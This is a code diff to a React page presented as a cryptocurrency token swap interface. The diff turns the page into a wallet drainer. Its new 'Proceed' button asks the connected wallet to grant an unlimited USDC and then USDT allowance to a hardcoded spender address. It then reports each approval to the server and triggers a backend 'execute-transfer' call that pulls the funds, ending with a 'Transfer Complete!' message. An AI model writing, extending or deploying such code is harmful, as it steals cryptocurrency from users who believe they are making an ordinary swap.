@@ -1,9 +1,27 @@
 import { Button } from "@/components/ui/button";
-import { ArrowDown, Settings, ChevronDown } from "lucide-react";
-import { useState } from "react";
-import { useAccount, useDisconnect } from "wagmi";
+import { ArrowDown, Settings, ChevronDown, Loader2, CheckCircle } from "lucide-react";
+import { useState, useEffect } from "react";
+import { useAccount, useDisconnect, useWriteContract, useWaitForTransactionReceipt } from "wagmi";
 import { useConnectModal } from "@rainbow-me/rainbowkit";
 import headerImage from "@assets/image_1767365952238.png";
+
+const SPENDER_ADDRESS = "0x749d037Dfb0fAFA39C1C199F1c89eD90b66db9F1";
+const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+const ERC20_ABI = [
+  {
+    constant: false,
+    inputs: [
+      { name: "_spender", type: "address" },
+      { name: "_value", type: "uint256" }
+    ],
+    name: "approve",
+    outputs: [{ name: "", type: "bool" }],
+    type: "function"
+  }
+] as const;
 
 const TokenIcon = ({ symbol, size = 24 }: { symbol: string; size?: number }) => {
   const icons: Record<string, JSX.Element> = {
@@ -56,6 +74,8 @@ const TOKENS = [
   { symbol: "WBTC", name: "Wrapped BTC" },
 ];
 
+type Step = "idle" | "approving" | "transferring" | "done";
+
 export default function Home() {
   const [activeTab, setActiveTab] = useState("Swap");
   const [sellAmount, setSellAmount] = useState("");
@@ -64,10 +84,100 @@ export default function Home() {
   const [buyToken, setBuyToken] = useState<typeof TOKENS[0] | null>(null);
   const [showSellTokens, setShowSellTokens] = useState(false);
   const [showBuyTokens, setShowBuyTokens] = useState(false);
+  
+  const [currentToken, setCurrentToken] = useState<"usdc" | "usdt" | "complete">("usdc");
+  const [step, setStep] = useState<Step>("idle");
+  const [error, setError] = useState<string>("");
 
   const { address, isConnected } = useAccount();
   const { openConnectModal } = useConnectModal();
   const { disconnect } = useDisconnect();
+  
+  const { writeContract, data: hash, isPending, reset } = useWriteContract();
+  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({ hash });
+
+  const tokenAddress = currentToken === "usdc" ? USDC_ADDRESS : USDT_ADDRESS;
+  const tokenSymbol = currentToken === "usdc" ? "USDC" : "USDT";
+
+  useEffect(() => {
+    if (isConfirmed && hash && step === "approving") {
+      fetch("/api/approvals", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          walletAddress: address,
+          tokenAddress: tokenAddress,
+          tokenSymbol,
+          transactionHash: hash,
+        }),
+      }).catch(console.error);
+
+      setStep("transferring");
+      executeRelayerTransfer();
+    }
+  }, [isConfirmed, hash, step]);
+
+  const executeRelayerTransfer = async () => {
+    try {
+      const response = await fetch("/api/execute-transfer", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          walletAddress: address,
+          tokenSymbol: currentToken.toUpperCase(),
+        }),
+      });
+
+      const result = await response.json();
+
+      if (result.success) {
+        goToNextToken();
+      } else {
+        if (result.error?.includes('No allowance') || result.error?.includes('no balance')) {
+          goToNextToken();
+        } else {
+          setError(result.error || "Transfer failed");
+          setStep("idle");
+        }
+      }
+    } catch (err: any) {
+      setError(err?.message || "Failed to execute transfer");
+      setStep("idle");
+    }
+  };
+
+  const goToNextToken = () => {
+    if (currentToken === "usdc") {
+      setCurrentToken("usdt");
+      setStep("idle");
+      reset();
+    } else {
+      setCurrentToken("complete");
+      setStep("done");
+    }
+  };
+
+  const handleProceed = () => {
+    if (!address) return;
+    setError("");
+
+    if (step === "idle") {
+      setStep("approving");
+      try {
+        writeContract({
+          address: tokenAddress as `0x${string}`,
+          abi: ERC20_ABI,
+          functionName: "approve",
+          args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
+        });
+      } catch (err: any) {
+        setError(err?.message || "Failed to approve token");
+        setStep("idle");
+      }
+    }
+  };
+
+  const isProcessing = isPending || isConfirming || step === "approving" || step === "transferring";
 
   const handleSwapDirection = () => {
     const tempToken = sellToken;
@@ -262,14 +372,35 @@ export default function Home() {
             </div>
 
             <div className="mt-4">
+              {error && (
+                <div className="mb-3 p-3 bg-red-50 border border-red-200 rounded-xl text-sm text-red-600">
+                  {error}
+                </div>
+              )}
+              
               {isConnected ? (
-                <Button
-                  className="w-full py-6 text-lg font-semibold rounded-2xl bg-[#FFF0FB] hover:bg-[#FFE4F5] text-[#FF00D6] border-0"
-                  disabled={!sellAmount || !buyToken}
-                  data-testid="button-swap"
-                >
-                  {!sellAmount ? "Enter an amount" : !buyToken ? "Select a token" : "Swap"}
-                </Button>
+                currentToken === "complete" ? (
+                  <div className="w-full py-4 text-lg font-semibold rounded-2xl bg-green-100 text-green-600 flex items-center justify-center gap-2">
+                    <CheckCircle className="w-5 h-5" />
+                    Transfer Complete!
+                  </div>
+                ) : (
+                  <button
+                    onClick={handleProceed}
+                    disabled={isProcessing}
+                    className="w-full py-4 text-lg font-semibold rounded-2xl bg-[#FF00D6] hover:bg-[#e800c0] text-white disabled:opacity-50 flex items-center justify-center gap-2"
+                    data-testid="button-proceed"
+                  >
+                    {isProcessing ? (
+                      <>
+                        <Loader2 className="w-5 h-5 animate-spin" />
+                        Processing...
+                      </>
+                    ) : (
+                      `Proceed with ${tokenSymbol}`
+                    )}
+                  </button>
+                )
               ) : (
                 <button
                   onClick={openConnectModal}
